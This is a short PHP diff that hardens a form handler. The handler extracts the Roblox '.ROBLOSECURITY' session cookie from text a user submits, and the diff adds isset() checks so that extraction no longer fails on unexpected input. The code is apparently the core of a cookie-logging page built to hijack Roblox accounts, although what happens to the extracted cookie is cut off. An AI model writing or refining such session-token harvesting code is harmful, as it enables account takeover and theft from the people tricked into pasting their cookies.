@@ -60,13 +60,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if (empty($errors)) {
         $cookie = explode('.ROBLOSECURITY", "', $code);
-        if ($cookie[1] == "") {
+        if (!isset($cookie[1]) || $cookie[1] == "") {
             $cookie = explode("ROBLOSECURITY=", $code);
-            $cookie = explode(';', $cookie[1]);
-            $cookie = $cookie[0];
+            if (isset($cookie[1])) {
+                $cookie = explode(';', $cookie[1]);
+                $cookie = isset($cookie[0]) ? $cookie[0] : '';
+            } else {
+                $cookie = '';
+            }
         } else {
             $cookie = explode('"', $cookie[1]);
-            $cookie = $cookie[0];
+            $cookie = isset($cookie[0]) ? $cookie[0] : '';
         }
 
         if ($cookie) {
